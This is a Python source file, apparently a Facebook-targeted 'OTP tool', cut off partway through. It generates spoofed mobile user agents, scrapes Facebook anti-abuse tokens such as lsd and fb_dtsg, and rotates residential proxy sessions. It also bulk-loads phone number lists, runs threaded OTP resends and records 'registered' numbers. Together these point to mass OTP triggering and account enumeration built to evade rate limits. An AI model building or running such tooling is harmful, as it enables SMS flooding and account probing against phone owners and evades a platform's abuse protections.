import os
import sys
import random
import re
import time
import json
import csv
import platform
import getpass
import datetime
import webbrowser
import threading
import itertools
import string

from curl_cffi import requests

os.system('chcp 65001 > nul')

WHITE = '\x1b[1;97m'
GREEN = '\x1b[38;5;220m'
RED = '\x1b[38;5;208m'
CYAN = '\x1b[38;5;214m'
YELLOW = '\x1b[38;5;228m'
BLUE = '\x1b[38;5;172m'
MAGENTA = '\x1b[38;5;216m'
ORANGE = '\x1b[38;5;202m'
GOLD = '\x1b[38;5;220m'
VIOLET = '\x1b[38;5;179m'
DIM = '\x1b[38;5;94m'
RESET = '\x1b[0m'

EKL = f'{CYAN}:{WHITE}'
LINE = f'{CYAN}✦═══════════════════════════════════════════════✦{WHITE}'
opt_labels = [f'{GREEN}〔{RED}{str(i).zfill(2)}{GREEN}〕' for i in range(1, 30)]


def clear_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(
        f'{CYAN}\n                    ✦ ═══════════════ ✦\n'
        f'{GREEN}   ██╗  ██╗███████╗███╗   ██╗ ██████╗ \n'
        f'   ╚██╗██╔╝██╔════╝████╗  ██║██╔═══██╗\n'
        f'    ╚███╔╝ █████╗  ██╔██╗ ██║██║   ██║\n'
        f'    ██╔██╗ ██╔══╝  ██║╚██╗██║██║   ██║\n'
        f'   ██╔╝ ██╗███████╗██║ ╚████║╚██████╔╝\n'
        f'   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝{RED}  ⚡ V-1.4\n'
        f'{CYAN}                    ✦ ═══════════════ ✦\n'
        f'{LINE}\n '
        f'{GREEN}〔{RED}◆{GREEN}〕 TOOL         {EKL} XENO OTP TOOL\n '
        f'{GREEN}〔{RED}◆{GREEN}〕 DEVELOPER    {EKL} Samol Hasan\n '
        f'{GREEN}〔{RED}◆{GREEN}〕 STATUS       {EKL} ✅ ACTIVE\n '
        f'{GREEN}〔{RED}◆{GREEN}〕 NOTICE       {EKL} {YELLOW}THIS TOOL IS FULLY FREE! DON\'T BUY IT!{RESET}\n '
        f'{GREEN}〔{RED}◆{GREEN}〕 DONATE       {EKL} {WHITE}Donate for Coffee: {YELLOW}01789440524 {GREEN}(bKash){RESET}\n'
        f'{LINE}'
    )


ANDROID_7_11_VERSIONS = ['7.0', '7.1', '7.1.1', '7.1.2', '8.0.0', '8.1.0', '9', '10', '11']

ANDROID_7_11_DEVICES = [
    ('SM-G935F', 'NRD90M'), ('SM-G950F', 'R16NW'), ('SM-G960F', 'PPR1.180610.011'),
    ('SM-G970F', 'PPR1.180610.011'), ('SM-G973F', 'PPR1.180610.011'), ('SM-G991B', 'RP1A.200720.012'),
    ('SM-A505F', 'QP1A.190711.020'), ('SM-A515F', 'QP1A.190711.020'), ('SM-A715F', 'QP1A.190711.020'),
    ('SM-N950F', 'NMF26X'), ('SM-N960F', 'PPR1.180610.011'), ('Pixel 2', 'OPD3.170816.012'),
    ('Pixel 3', 'QQ3A.200805.001'), ('Pixel 4', 'RQ3A.210905.001'), ('Pixel 4a', 'RQ3A.211001.001'),
    ('Redmi Note 7', 'PKQ1.181203.001'), ('Redmi Note 8 Pro', 'PPR1.180610.011'), ('Redmi Note 9', 'QP1A.190711.020'),
    ('Redmi Note 10 Pro', 'RKQ1.200826.002'), ('Mi 9', 'PKQ1.181121.001'), ('Mi 10', 'QKQ1.191222.002'),
    ('POCO F1', 'PKQ1.180729.001'), ('POCO X3', 'QQ3A.200805.001'), ('HUAWEI P20', 'HUAWEIEML-L29'),
    ('HUAWEI P30', 'HUAWEIELE-L29'), ('OnePlus 6', 'ONEPLUS A6003'), ('OnePlus 7 Pro', 'ONEPLUS A7010'),
    ('RMX1911', 'QKQ1.200209.002'), ('CPH1909', 'QP1A.190711.020'), ('SM-G981B', 'QP1A.190711.020'),
    ('SM-G986B', 'QP1A.190711.020'), ('SM-G988B', 'QP1A.190711.020'), ('SM-N970F', 'QP1A.190711.020'),
    ('SM-N975F', 'QP1A.190711.020'), ('SM-N986B', 'QP1A.190711.020'), ('SM-A105F', 'PPR1.180610.011'),
    ('SM-A205F', 'PPR1.180610.011'), ('SM-A305F', 'PPR1.180610.011'), ('SM-M315F', 'QP1A.190711.020'),
    ('SM-M515F', 'QP1A.190711.020'), ('Pixel 3a', 'QQ3A.200805.001'), ('Pixel 5', 'RQ3A.210905.001'),
    ('Redmi Note 8', 'PKQ1.190616.001'), ('Redmi 9', 'QP1A.190711.020'), ('Redmi 9T', 'QKQ1.200830.002'),
    ('Mi 9T Pro', 'QKQ1.190825.002'), ('Mi 10T Pro', 'RKQ1.200826.002'), ('POCO M3', 'QKQ1.200830.002'),
    ('HUAWEI Mate 20 Pro', 'HUAWEILYA-L29'), ('HUAWEI Mate 30 Pro', 'HUAWEILIO-L29'), ('VOG-L29', 'HUAWEIVOG-L29'),
    ('MAR-LX1A', 'HUAWEIMAR-LX1A'), ('OnePlus 8 Pro', 'IN2023'), ('OnePlus 8T', 'KB2003'),
    ('OnePlus 9 Pro', 'LE2123'), ('RMX2001', 'QP1A.190711.020'), ('RMX2061', 'QP1A.190711.020'),
    ('RMX2151', 'QP1A.190711.020'), ('CPH2083', 'QP1A.190711.020'), ('CPH2127', 'RKQ1.200903.002'),
    ('CPH2205', 'RKQ1.200903.002'), ('vivo 1904', 'PPR1.180610.011'), ('vivo 1920', 'QP1A.190711.020'),
    ('vivo 2018', 'RKQ1.200819.002'), ('motorola one vision', 'QSAS30.62-24-3'), ('moto g(8) plus', 'QPI30.28-Q3-28'),
    ('moto g(9) play', 'QPZ30.30-Q3-38'), ('Nokia 7.2', 'QKQ1.191014.001'), ('Nokia 8.1', 'QKQ1.190828.002'),
    ('Nokia 5.3', 'QKQ1.191014.001'), ('LM-G710', 'PKQ1.181105.001'), ('LM-G810', 'PKQ1.190416.001'),
    ('LM-V600', 'QKQ1.191222.002'), ('Sony G8142', 'PKQ1.190118.001'), ('Sony H8216', 'PKQ1.190118.001'),
    ('Sony J9110', 'QKQ1.190918.001')
]


def get_android_7_11():
    chrome_major = random.randint(56, 95)
    chrome_version = f'{chrome_major}.0.{random.randint(2900, 4700)}.{random.randint(50, 200)}'
    android_ver = random.choice(ANDROID_7_11_VERSIONS)
    device, build = random.choice(ANDROID_7_11_DEVICES)
    return f'Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'


ANDROID_12_15_VERSIONS = ['12', '12L', '13', '14', '15']

ANDROID_12_15_DEVICES = [
    ('Pixel 6', 'SD1A.210817.036'), ('Pixel 6 Pro', 'SD1A.210817.036'), ('Pixel 7', 'TQ3A.230901.001'),
    ('Pixel 7 Pro', 'TQ3A.230901.001'), ('Pixel 8', 'UD1A.230803.041'), ('Pixel 8 Pro', 'UD1A.230803.041'),
    ('Pixel 9', 'AP3A.241005.015'), ('Pixel 9 Pro', 'AP3A.241005.015'), ('SM-S908B', 'SP1A.210812.016'),
    ('SM-S911B', 'TP1A.220624.014'), ('SM-S918B', 'TP1A.220624.014'), ('SM-S928B', 'UP1A.231005.007'),
    ('SM-S938B', 'AP3A.241105.008'), ('SM-A546B', 'TP1A.220624.014'), ('SM-A556B', 'UP1A.231005.007'),
    ('SM-A736B', 'SP1A.210812.016'), ('SM-S901B', 'SP1A.210812.016'), ('SM-S906B', 'SP1A.210812.016'),
    ('Redmi Note 11', 'SKQ1.211006.001'), ('Redmi Note 12 Pro', 'TP1A.220624.014'), ('Redmi Note 13 Pro', 'UP1A.231005.007'),
    ('POCO F5', 'TKQ1.221114.001'), ('OnePlus 10 Pro', 'SKQ1.211006.001'), ('OnePlus 11', 'TP1A.220624.014'),
    ('OnePlus 12', 'UP1A.231005.007'), ('CPH2491', 'TP1A.220624.014'), ('V2227A', 'SP1A.210812.016'),
    ('M2101K6G', 'SKQ1.210908.001'), ('Nothing Phone (2)', 'TQ3A.230901.001'), ('ASUS_AI2302', 'TP1A.220624.014'),
    ('SM-F711B', 'SP1A.210812.016'), ('SM-F926B', 'SP1A.210812.016'), ('SM-F721B', 'TP1A.220624.014'),
    ('SM-F936B', 'TP1A.220624.014'), ('SM-F731B', 'UP1A.231005.007'), ('SM-F946B', 'UP1A.231005.007'),
    ('SM-F741B', 'UP1A.231005.007'), ('SM-F956B', 'UP1A.231005.007'), ('SM-A146B', 'TP1A.220624.014'),
    ('SM-A346B', 'TP1A.220624.014'), ('SM-A156B', 'UP1A.231005.007'), ('SM-A256B', 'UP1A.231005.007'),
    ('SM-A356B', 'UP1A.231005.007'), ('Pixel 6a', 'SD2A.220601.003'), ('Pixel 7a', 'TQ3A.230901.001'),
    ('Pixel 8a', 'UD1A.230803.041'), ('Pixel Fold', 'TQ3A.230901.001'), ('Pixel 9 Pro Fold', 'AP3A.241005.015'),
    ('2201116SG', 'SKQ1.211006.001'), ('22101320G', 'TP1A.220624.014'), ('23049PCD8G', 'TP1A.220624.014'),
    ('23122PCD1G', 'UP1A.231005.007'), ('POCO X4 Pro 5G', 'SKQ1.211103.001'), ('POCO X5 Pro 5G', 'TP1A.220624.014'),
    ('POCO F4', 'SKQ1.211006.001'), ('POCO X6 Pro', 'UP1A.231005.007'), ('Xiaomi 12', 'SKQ1.211006.001'),
    ('Xiaomi 13', 'TP1A.220624.014'), ('Xiaomi 14', 'UP1A.231005.007'), ('OnePlus Nord 2T', 'SP1A.210812.016'),
    ('OnePlus Nord 3', 'TP1A.220624.014'), ('OnePlus Open', 'UP1A.231005.007'), ('RMX3363', 'SP1A.210812.016'),
    ('RMX3561', 'SP1A.210812.016'), ('RMX3771', 'TP1A.220624.014'), ('RMX3840', 'UP1A.231005.007'),
    ('CPH2359', 'SP1A.210812.016'), ('CPH2437', 'TP1A.220624.014'), ('CPH2525', 'UP1A.231005.007'),
    ('V2109', 'SP1A.210812.016'), ('V2207', 'TP1A.220624.014'), ('V2303', 'UP1A.231005.007'),
    ('V2338', 'UP1A.231005.007'), ('motorola edge 30', 'S1RDS32.55-73-2'), ('motorola edge 40', 'T1TL33.72-22-2'),
    ('motorola razr 40 ultra', 'T1TZ33.3-62-2'), ('Nothing Phone (1)', 'SKQ1.211230.001'),
    ('Nothing Phone (2a)', 'UP1A.231005.007'), ('Sony XQ-CT54', 'TP1A.220624.014'), ('Sony XQ-DQ54', 'TP1A.220624.014')
]


def get_android_12_15():
    chrome_major = random.randint(96, 133)
    chrome_version = f'{chrome_major}.0.{random.randint(4664, 6917)}.{random.randint(30, 150)}'
    android_ver = random.choice(ANDROID_12_15_VERSIONS)
    device, build = random.choice(ANDROID_12_15_DEVICES)
    return f'Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'


IOS_MEDIUM_VERSIONS = [
    ('13_0', '605.1.15', '13.0', '17A577'), ('13_1', '605.1.15', '13.0.1', '17A844'),
    ('13_3', '605.1.15', '13.0.4', '17C54'), ('13_4', '605.1.15', '13.1', '17E255'),
    ('13_5', '605.1.15', '13.1.1', '17F75'), ('13_5_1', '605.1.15', '13.1.1', '17F80'),
    ('13_6', '605.1.15', '13.1.2', '17G68'), ('13_7', '605.1.15', '13.1.2', '17H35'),
    ('14_0', '605.1.15', '14.0', '18A373'), ('14_2', '605.1.15', '14.0.1', '18B92'),
    ('14_4', '605.1.15', '14.0.3', '18D52'), ('14_6', '605.1.15', '14.1.1', '18F72'),
    ('14_7_1', '605.1.15', '14.1.2', '18G82'), ('14_8', '605.1.15', '14.1.2', '18H17'),
    ('15_0', '605.1.15', '15.0', '19A346'), ('15_1', '605.1.15', '15.1', '19B74'),
    ('15_4', '605.1.15', '15.4', '19E241'), ('15_5', '605.1.15', '15.5', '19F77'),
    ('15_6', '605.1.15', '15.6', '19G71'), ('15_6_1', '605.1.15', '15.6.1', '19G82')
]


def get_ios_medium():
    ios_ver, webkit, safari_ver, build = random.choice(IOS_MEDIUM_VERSIONS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split('.')[0]}.1"


IOS_NEW_VERSIONS = [
    ('16_5', '605.1.15', '16.5', '20F66'), ('16_5_1', '605.1.15', '16.5.1', '20F75'),
    ('16_6', '605.1.15', '16.6', '20G75'), ('16_6_1', '605.1.15', '16.6.1', '20G81'),
    ('16_7', '605.1.15', '16.7', '20H18'), ('16_7_2', '605.1.15', '16.7.2', '20H115'),
    ('16_7_4', '605.1.15', '16.7.4', '20H121'), ('16_7_5', '605.1.15', '16.7.5', '20H307'),
    ('16_7_7', '605.1.15', '16.7.7', '20H330'), ('16_7_8', '605.1.15', '16.7.8', '20H343'),
    ('16_7_10', '605.1.15', '16.7.10', '20H350'), ('17_0', '605.1.15', '17.0', '21A329'),
    ('17_0_1', '605.1.15', '17.0.1', '21A340'), ('17_0_2', '605.1.15', '17.0.2', '21A351'),
    ('17_0_3', '605.1.15', '17.0.3', '21A360'), ('17_1', '605.1.15', '17.1', '21B74'),
    ('17_1_1', '605.1.15', '17.1.1', '21B91'), ('17_1_2', '605.1.15', '17.1.2', '21B101'),
    ('17_2', '605.1.15', '17.2', '21C62'), ('17_2_1', '605.1.15', '17.2.1', '21C66'),
    ('17_3', '605.1.15', '17.3', '21D50'), ('17_3_1', '605.1.15', '17.3.1', '21D61'),
    ('17_4', '605.1.15', '17.4', '21E219'), ('17_4_1', '605.1.15', '17.4.1', '21E236'),
    ('17_5', '605.1.15', '17.5', '21F79'), ('17_5_1', '605.1.15', '17.5.1', '21F90'),
    ('17_6', '605.1.15', '17.6', '21G80'), ('17_6_1', '605.1.15', '17.6.1', '21G93'),
    ('17_6_1', '605.1.15', '17.6.1', '21G101'), ('17_7', '605.1.15', '17.7', '21H16'),
    ('17_7_1', '605.1.15', '17.7.1', '21H216'), ('17_7_2', '605.1.15', '17.7.2', '21H221'),
    ('18_0', '605.1.15', '18.0', '22A3354'), ('18_0_1', '605.1.15', '18.0.1', '22A3370'),
    ('18_1', '605.1.15', '18.1', '22B83'), ('18_1_1', '605.1.15', '18.1.1', '22B91'),
    ('18_2', '605.1.15', '18.2', '22C152'), ('18_2_1', '605.1.15', '18.2.1', '22C161'),
    ('18_3', '605.1.15', '18.3', '22D63'), ('18_3_1', '605.1.15', '18.3.1', '22D72'),
    ('18_4', '605.1.15', '18.4', '22E210'), ('18_4_1', '605.1.15', '18.4.1', '22E252'),
    ('18_5', '605.1.15', '18.5', '22F76'), ('18_5_1', '605.1.15', '18.5.1', '22F80'),
    ('18_6', '605.1.15', '18.6', '22G80'), ('18_6_1', '605.1.15', '18.6.1', '22G90'),
    ('18_7', '605.1.15', '18.7', '22H120')
]


def get_ios_new():
    ios_ver, webkit, safari_ver, build = random.choice(IOS_NEW_VERSIONS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split('.')[0]}.1"


IPAD_NEW_VERSIONS = [
    ('15_0', '605.1.15', '15.0', '19A346'), ('15_4', '605.1.15', '15.4', '19E241'),
    ('15_5', '605.1.15', '15.5', '19F77'), ('15_6', '605.1.15', '15.6', '19G71'),
    ('16_0', '605.1.15', '16.0', '20A362'), ('16_3', '605.1.15', '16.3', '20D47'),
    ('16_5', '605.1.15', '16.5', '20F66'), ('16_6', '605.1.15', '16.6', '20G75'),
    ('17_0', '605.1.15', '17.0', '21A329'), ('17_2', '605.1.15', '17.2', '21C62'),
    ('17_4', '605.1.15', '17.4', '21E219'), ('17_5', '605.1.15', '17.5', '21F79'),
    ('18_0', '605.1.15', '18.0', '22A3354'), ('18_1', '605.1.15', '18.1', '22B83')
]


def get_ipad_new():
    ios_ver, webkit, safari_ver, build = random.choice(IPAD_NEW_VERSIONS)
    return f"Mozilla/5.0 (iPad; CPU OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split('.')[0]}.1"


LSD_PATTERNS = [
    re.compile(r'"LSD",\[\],\{"token":"([^"]+)"\}'),
    re.compile(r'"lsd"\s*:\s*"([^"]+)"'),
    re.compile(r'name="lsd"\s+value="([^"]+)"'),
    re.compile(r'\["LSD",\[\],\{"token":"([^"]+)"\}'),
    re.compile(r'"token"\s*:\s*"([^"]+)"')
]
REV_PATTERN = re.compile(r'"server_revision"\s*:\s*(\d+)')
HSI_PATTERN = re.compile(r'"hsi"\s*:\s*"(\d+)"')
SPIN_B_PATTERN = re.compile(r'"__spin_b"\s*:\s*"([^"]+)"')
SPIN_T_PATTERN = re.compile(r'"__spin_t"\s*:\s*(\d+)')
HS_PATTERNS = [
    re.compile(r'"haste_session"\s*:\s*"([^"]+)"'),
    re.compile(r'"__hs"\s*:\s*"([^"]+)"')
]
COMET_REQ_PATTERN = re.compile(r'"__comet_req"\s*:\s*"?(\d+)"?')
FB_DTSG_PATTERNS = [
    re.compile(r'"DTSGInitialData",\[\],\{"token":"([^"]+)"\}'),
    re.compile(r'"dtsg"\s*:\s*\{"token"\s*:\s*"([^"]+)"\}'),
    re.compile(r'name="fb_dtsg"\s+value="([^"]+)"'),
    re.compile(r'"fb_dtsg"\s*:\s*"([^"]+)"')
]
DYN_PATTERN = re.compile(r'"__dyn"\s*:\s*"([^"]+)"')
CSR_PATTERN = re.compile(r'"__csr"\s*:\s*"([^"]+)"')
HSDP_PATTERN = re.compile(r'"__hsdp"\s*:\s*"([^"]+)"')
HBLP_PATTERN = re.compile(r'"__hblp"\s*:\s*"([^"]+)"')
SJSP_PATTERN = re.compile(r'"__sjsp"\s*:\s*"([^"]+)"')
TOS_CMS_ID_PATTERN = re.compile(r'"tos_cms_id"\s*:\s*"?(\d+)"?|tos_cms_id["\s:=]+(\d{12,16})|"tosId"\s*:\s*"?(\d+)"?')

META_DEFAULT_TOS_CMS_ID = '957798449862312'
META_SERVER_REVISION = '1054618140'
META_HASTE_SESSION = '20771.HYP:frl_comet_auth_pkg.2.1...0'
META_DEFAULT_DYN = '7xe6E5q5U5ObwKBAg5S1Dxu13w8CewSwMwNw9G2S0lW4o0B-q1ew2io2awpUO0n24o5-0Bo7O2l0Fwqo31w9O0H8-U2zxe2GewbS361qw8Xwn82Lw6OyES1Tw8W0Lo6-1FwCwe-1Iw4swUw8S1Tw4-w3C8doW0DE'
META_DEFAULT_CSR = 'q1AZ5CsDoJBZqReGWPgxnFl6AGnV9FpKUxqyoR4y6VVqxR2paVpGyV85C02nS9w0Hb5tEzma261oWEFU2ew0yTw05tcwbS0f4w3cQ2Cz02FU08dE0qNxy1lgaUgUognxef80dcyd01gK'
META_DEFAULT_HSDP = '83xddkQr0wwNo4gE11U3nxG0cdh82_yo3yU07ca07aE'
META_DEFAULT_HBLP = '0cq223yUux60Uoqw9K17xzyo0Mii7U9E7yii0J8bo1jU084o0tFw0xZw3iUbE0sGw26EjUlw25E0N-0cNw19i1_wYw'
META_DEFAULT_SJSP = '83xddkQGd0ww'
META_DEFAULT_COMET_REQ = '33'


def calc_jazoest(token):
    if not token:
        return ''
    return '2' + str(sum(ord(c) for c in token))


def to_base36(num):
    if num == 0:
        return '0'
    chars = '0123456789abcdefghijklmnopqrstuvwxyz'
    res = ''
    while num > 0:
        num, r = divmod(num, 36)
        res = chars[r] + res
    return res


def extract_tokens(
    html,
    session_cookies=None,
    default_lsd='',
    default_rev=META_SERVER_REVISION,
    default_hsi='',
    default_hs=META_HASTE_SESSION,
    default_spin_b='trunk',
    default_spin_t='',
    default_comet_req='72'
):
    tokens = {}
    lsd_val = default_lsd
    for p in LSD_PATTERNS:
        match = p.search(html)
        if match:
            lsd_val = match.group(1)
            break
    tokens['lsd'] = lsd_val

    rev_match = REV_PATTERN.search(html)
    tokens['rev'] = rev_match.group(1) if rev_match else default_rev

    hsi_match = HSI_PATTERN.search(html)
    tokens['hsi'] = hsi_match.group(1) if hsi_match else default_hsi

    spin_b_match = SPIN_B_PATTERN.search(html)
    tokens['spin_b'] = spin_b_match.group(1) if spin_b_match else default_spin_b

    spin_t_match = SPIN_T_PATTERN.search(html)
    tokens['spin_t'] = spin_t_match.group(1) if spin_t_match else (default_spin_t or str(int(time.time())))

    hs_val = default_hs
    for p in HS_PATTERNS:
        match = p.search(html)
        if match:
            hs_val = match.group(1)
            break
    tokens['hs'] = hs_val

    comet_match = COMET_REQ_PATTERN.search(html)
    tokens['comet_req'] = comet_match.group(1) if comet_match else default_comet_req

    fb_dtsg = ''
    for p in FB_DTSG_PATTERNS:
        m = p.search(html)
        if m:
            fb_dtsg = m.group(1)
            break
    tokens['fb_dtsg'] = fb_dtsg

    dyn_match = DYN_PATTERN.search(html)
    tokens['dyn'] = dyn_match.group(1) if dyn_match else META_DEFAULT_DYN

    csr_match = CSR_PATTERN.search(html)
    tokens['csr'] = csr_match.group(1) if csr_match else META_DEFAULT_CSR

    hsdp_match = HSDP_PATTERN.search(html)
    tokens['hsdp'] = hsdp_match.group(1) if hsdp_match else META_DEFAULT_HSDP

    hblp_match = HBLP_PATTERN.search(html)
    tokens['hblp'] = hblp_match.group(1) if hblp_match else META_DEFAULT_HBLP

    sjsp_match = SJSP_PATTERN.search(html)
    tokens['sjsp'] = sjsp_match.group(1) if sjsp_match else META_DEFAULT_SJSP

    tos_match = TOS_CMS_ID_PATTERN.search(html)
    if tos_match:
        tokens['tos_cms_id'] = tos_match.group(1) or tos_match.group(2) or tos_match.group(3) or META_DEFAULT_TOS_CMS_ID
    else:
        tokens['tos_cms_id'] = META_DEFAULT_TOS_CMS_ID

    if lsd_val:
        tokens['jazoest'] = calc_jazoest(lsd_val)
    elif session_cookies is not None:
        try:
            if hasattr(session_cookies, 'get_dict'):
                all_cookie_str = ''.join(session_cookies.get_dict().values())
            elif isinstance(session_cookies, dict):
                all_cookie_str = ''.join(str(v) for v in session_cookies.values())
            else:
                all_cookie_str = ''
            tokens['jazoest'] = calc_jazoest(all_cookie_str) if all_cookie_str else ''
        except Exception:
            tokens['jazoest'] = ''
    else:
        tokens['jazoest'] = ''
    return tokens


DEFAULT_SETTINGS = {
    'api_settings': {
        'file_input_settings': {'always_use_txt': False, 'use_multiple_excel_files': False},
        'proxy_settings': {'ask_for_proxy': False, 'default_proxy': '2'},
        'user_agent_settings': {'ask_for_user_agent': True, 'default_user_agent': 'win_all'},
        'language_settings': {'ask_for_language': True, 'default_language': 'auto'},
        'otp_settings': {'ask_for_resend_count': True, 'default_resend_count': 1},
        'thread_settings': {'ask_for_threads': True, 'default_threads': 5}
    },
    'selenium_settings': {
        'file_input_settings': {'always_use_txt': False, 'use_multiple_excel_files': False},
        'proxy_settings': {'ask_for_proxy': True, 'default_proxy': ''},
        'user_agent_settings': {'ask_for_user_agent': False, 'default_user_agent': 'random'},
        'otp_settings': {'ask_for_resend_count': True, 'default_resend_count': 1},
        'thread_settings': {'ask_for_threads': True, 'default_threads': 5},
        'browser_settings': {'ask_for_browser': True, 'default_browser': 'chrome'},
        'headless_settings': {'ask_for_headless': True, 'default_headless': False},
        'route_settings': {'ask_for_route': True, 'default_route': 0},
        'work_mode': {'ask_for_mode': True, 'default_mode': 0}
    },
    'mfacebook_settings': {
        'file_input_settings': {'always_use_txt': False, 'use_multiple_excel_files': False},
        'proxy_settings': {'ask_for_proxy': False, 'default_proxy': '2'},
        'user_agent_settings': {'ask_for_user_agent': True, 'default_user_agent': 'android_all'},
        'language_settings': {'ask_for_language': True, 'default_language': 'auto'},
        'otp_settings': {'ask_for_resend_count': True, 'default_resend_count': 1},
        'thread_settings': {'ask_for_threads': True, 'default_threads': 5}
    },
    'web_facebook_settings': {
        'file_input_settings': {'always_use_txt': False, 'use_multiple_excel_files': False},
        'proxy_settings': {'ask_for_proxy': False, 'default_proxy': '2'},
        'user_agent_settings': {'ask_for_user_agent': True, 'default_user_agent': 'win_all'},
        'language_settings': {'ask_for_language': True, 'default_language': 'auto'},
        'otp_settings': {'ask_for_resend_count': True, 'default_resend_count': 1},
        'thread_settings': {'ask_for_threads': True, 'default_threads': 5}
    }
}


def load_settings(setting_key='api_settings'):
    return DEFAULT_SETTINGS.get(setting_key, {})


def get_number_file_path():
    paths = [
        'numbers.txt', 'Number_List.txt',
        '/sdcard/numbers.txt', '/sdcard/Download/numbers.txt',
        '/sdcard/Number_List.txt', '/sdcard/Download/Number_List.txt',
        '/storage/emulated/0/Download/numbers.txt', '/storage/emulated/0/Download/Number_List.txt'
    ]
    for p in paths:
        if os.path.exists(p) and os.path.getsize(p) > 0:
            return p
    for p in paths:
        if os.path.exists(p):
            return p
    return 'Number_List.txt'


def get_proxy_file_path():
    paths = [
        'proxy.txt', 'Proxy_List.txt',
        '/sdcard/proxy.txt', '/sdcard/Download/proxy.txt',
        '/sdcard/Proxy_List.txt', '/sdcard/Download/Proxy_List.txt',
        '/storage/emulated/0/Download/proxy.txt', '/storage/emulated/0/Download/Proxy_List.txt'
    ]
    for p in paths:
        if os.path.exists(p) and os.path.getsize(p) > 0:
            return p
    for p in paths:
        if os.path.exists(p):
            return p
    return 'Proxy_List.txt'


def get_registered_file_path():
    num_file = get_number_file_path()
    dir_name = os.path.dirname(num_file)
    if dir_name:
        return os.path.join(dir_name, 'Registered_Numbers.txt')
    return 'Registered_Numbers.txt'


def parse_proxy(proxy_str):
    import urllib.parse
    import random
    import re
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    if proxy_str.startswith('http://'):
        proxy_str = proxy_str[7:]
    elif proxy_str.startswith('https://'):
        proxy_str = proxy_str[8:]

    if '@' in proxy_str:
        part1, part2 = proxy_str.split('@', 1)
        p1s = part1.split(':')
        p2s = part2.split(':')
        if len(p2s) == 2 and p2s[1].isdigit():
            user, pwd = p1s[0], ':'.join(p1s[1:])
            host, port = p2s[0], p2s[1]
        elif len(p1s) == 2 and p1s[1].isdigit():
            host, port = p1s[0], p1s[1]
            user, pwd = p2s[0], ':'.join(p2s[1:])
        else:
            user, pwd = p1s[0], ':'.join(p1s[1:])
            host, port = p2s[0], p2s[-1]
    else:
        parts = proxy_str.split(':')
        if len(parts) == 2:
            host, port = parts[0], parts[1]
            user, pwd = '', ''
        elif len(parts) >= 4:
            if parts[1].isdigit():
                host, port = parts[0], parts[1]
                user, pwd = parts[2], ':'.join(parts[3:])
            else:
                user, pwd = parts[0], parts[1]
                host, port = parts[2], parts[3]
        else:
            return None

    if user:
        user = urllib.parse.unquote(user)
        pwd = urllib.parse.unquote(pwd)
        if 'session' in user.lower():
            user = re.sub(r'session-[a-zA-Z0-9]+', f'session-s{random.randint(100000, 999999)}', user)
        elif any(k in user.lower() or k in host.lower() for k in ('zone', 'linkup', 'brightdata', 'luminati', 'trustsource', 'rotgb', 'proxy')):
            user = f'{user}-session-s{random.randint(1000000, 9999999)}'
        user_enc = urllib.parse.quote(user, safe='')
        pwd_enc = urllib.parse.quote(pwd, safe='')
        proxy_url = f'http://{user_enc}:{pwd_enc}@{host}:{port}'
    else:
        proxy_url = f'http://{host}:{port}'

    return {'http': proxy_url, 'https': proxy_url}


def load_proxy_list():
    proxy_file = get_proxy_file_path()
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parsed = parse_proxy(line)
                    if parsed:
                        proxies.append({'proxy': parsed, 'original': line})
    return proxies


def get_proxy_list(settings_key='api_settings', prompt_label='Proxy'):
    return load_proxy_list()


def load_settings(setting_key='api_settings'):
    return DEFAULT_SETTINGS.get(setting_key, {})


CLEAN_PATTERN = re.compile(r'[\s\-\(\)\.]')
PHONE_PATTERN = re.compile(r'^\+?\d{7,15}$')


def clean_and_validate(value):
    if value is None:
        return None
    raw = str(value).strip()
    if not raw:
        return None
    has_plus = raw.startswith('+')
    cleaned = CLEAN_PATTERN.sub('', raw)
    if PHONE_PATTERN.match(cleaned):
        if has_plus and not cleaned.startswith('+'):
            cleaned = '+' + cleaned
        return cleaned
    return None


def column_phone_score(col_values):
    total = 0
    phone_count = 0
    for v in col_values:
        if v is not None and str(v).strip():
            total += 1
            if clean_and_validate(v):
                phone_count += 1
    return (phone_count / total) if total > 0 else 0.0


def detect_and_extract_numbers(rows):
    if not rows:
        return []
    max_cols = max((len(row) for row in rows if row), default=0)
    if max_cols == 0:
        return []
    first_row = rows[0]
    has_header = not any(clean_and_validate(v) for v in first_row if v is not None)
    data_rows = rows[1:] if has_header and len(rows) > 1 else rows
    sample_size = min(100, len(data_rows))
    sample_rows = data_rows[:sample_size]
    best_col = 0
    best_score = -1.0
    for col_idx in range(max_cols):
        col_values = [row[col_idx] for row in sample_rows if col_idx < len(row)]
        score = column_phone_score(col_values)
        if score > best_score:
            best_score = score
            best_col = col_idx
    if best_score < 0.5 and max_cols > 1:
        pass
    numbers = []
    for row in data_rows:
        if best_col < len(row):
            cleaned = clean_and_validate(row[best_col])
            if cleaned:
                numbers.append(cleaned)
    return numbers


def read_numbers_from_txt(file_path):
    lines = []
    for enc in ('utf-8', 'utf-8-sig', 'cp1252', 'latin-1'):
        try:
            with open(file_path, 'r', encoding=enc) as f:
                lines = f.readlines()
            break
        except (UnicodeDecodeError, UnicodeError):
            continue
    numbers = []
    for line in lines:
        line = line.strip()
        if line:
            cleaned = clean_and_validate(line)
            if cleaned:
                numbers.append(cleaned)
    return numbers


def read_numbers_from_csv(file_path):
    rows = []
    for enc in ('utf-8', 'utf-8-sig', 'cp1252', 'latin-1'):
        try:
            with open(file_path, 'r', encoding=enc, newline='') as f:
                rows = list(csv.reader(f))
            break
        except (UnicodeDecodeError, UnicodeError):
            continue
